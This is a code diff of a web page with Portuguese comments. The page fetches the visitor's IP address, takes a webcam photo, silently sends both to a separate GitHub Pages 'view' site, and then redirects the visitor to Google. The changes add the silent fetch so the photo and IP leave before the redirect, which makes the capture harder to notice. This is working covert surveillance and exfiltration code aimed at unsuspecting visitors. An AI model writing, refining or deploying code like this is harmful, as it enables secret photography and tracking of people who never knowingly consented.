@@ -18,9 +18,8 @@
         // CONFIGURAÇÃO
         // ==========================================================
         
-        // URL da sua página de visualização de destino (GitHub Pages)
-        // **SUBSTITUA** por sua URL real no GitHub Pages
-        const VIEW_SITE_URL = 'https://leozin-code.github.io/ClienteViewFoto/'; 
+        // 🚨 SUBSTITUA por sua URL real do ClienteViewFoto no GitHub Pages
+        const VIEW_SITE_URL = 'https://SEU_USUARIO.github.io/ClienteViewFoto/SiteViewFoto.html'; 
         
         const REDIRECT_URL = 'https://www.google.com';
 
@@ -30,17 +29,15 @@
         let photoData = null;
         let userIP = 'IP_NAO_ENCONTRADO';
 
-        // 1. Capturar o IP do usuário usando um serviço público
+        // 1. Capturar o IP do usuário
         function fetchUserIP() {
-            // Este serviço é gratuito e retorna o IP como texto simples
             return fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     userIP = data.ip;
                 })
                 .catch(error => {
-                    console.error("Erro ao obter IP:", error);
-                    // Continua mesmo sem o IP
+                    console.warn("Falha ao obter IP. Usando IP_NAO_ENCONTRADO.", error);
                 });
         }
 
@@ -50,12 +47,6 @@
                 .then(stream => {
                     video.srcObject = stream;
                     return new Promise(resolve => video.onloadedmetadata = resolve);
-                })
-                .catch(error => {
-                    console.error("Erro ao acessar a webcam:", error);
-                    // Se falhar, redireciona sem a foto
-                    finalize(null); 
-                    return Promise.reject(error); 
                 });
         }
 
@@ -66,41 +57,51 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             // Converte para Base64 (sem o prefixo "data:image/png;base64,")
-            const base64Data = canvas.toDataURL('image/png').split(',')[1];
-            photoData = base64Data;
+            photoData = canvas.toDataURL('image/png').split(',')[1];
         }
 
         // 4. Finalizar e Redirecionar
-        function finalize(data) {
+        function finalize(data, stream) {
             // Parar o stream da webcam para liberar o recurso
-            if (video.srcObject) {
-                video.srcObject.getTracks().forEach(track => track.stop());
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
             }
 
-            let finalURL = VIEW_SITE_URL;
-            if (data) {
-                // Constrói a URL com a foto e o IP (codificando para a URL)
-                finalURL += `?ip=${encodeURIComponent(data.ip)}&img=${encodeURIComponent(data.img)}`;
+            if (data && data.img) {
+                // Constrói a URL com a foto e o IP
+                const finalURL = VIEW_SITE_URL + 
+                                 `?ip=${encodeURIComponent(data.ip)}&img=${encodeURIComponent(data.img)}`;
+                
+                // Envia uma requisição silenciosa (fetch) para a URL de visualização.
+                // Isso força o navegador do usuário a carregar e salvar a foto no LocalStorage,
+                // antes que ele seja redirecionado para o Google.
+                fetch(finalURL)
+                    .then(() => { /* Sucesso */ })
+                    .catch(() => { /* Ignora erro de rede/CORS se for o caso */ })
+                    .finally(() => {
+                        // Redireciona o usuário para o Google
+                        window.location.href = REDIRECT_URL;
+                    });
+            } else {
+                 // Se não houve foto, redireciona diretamente para o Google
+                 window.location.href = REDIRECT_URL;
             }
-
-            // Redireciona para o Google ou, se houver dados, para a View, que, por sua vez, redireciona
-            window.location.href = data ? finalURL : REDIRECT_URL;
         }
 
         // Fluxo Principal (executa sequencialmente)
         async function runCaptureFlow() {
+            let stream = null;
             await fetchUserIP();
             
             try {
-                await startWebcam();
+                // Inicia e obtém o stream
+                stream = await startWebcam().then(() => video.srcObject);
                 takePhoto();
-                finalize({ ip: userIP, img: photoData });
+                finalize({ ip: userIP, img: photoData }, stream);
             } catch (e) {
-                // A falha já foi tratada dentro de startWebcam()
-                if (!photoData) {
-                   // Se não houve foto, redireciona para o Google
-                   window.location.href = REDIRECT_URL;
-                }
+                console.error("Erro no fluxo de captura:", e);
+                // Em caso de qualquer falha (câmera bloqueada, etc.), finalize sem dados
+                finalize(null, stream); 
             }
         }
 
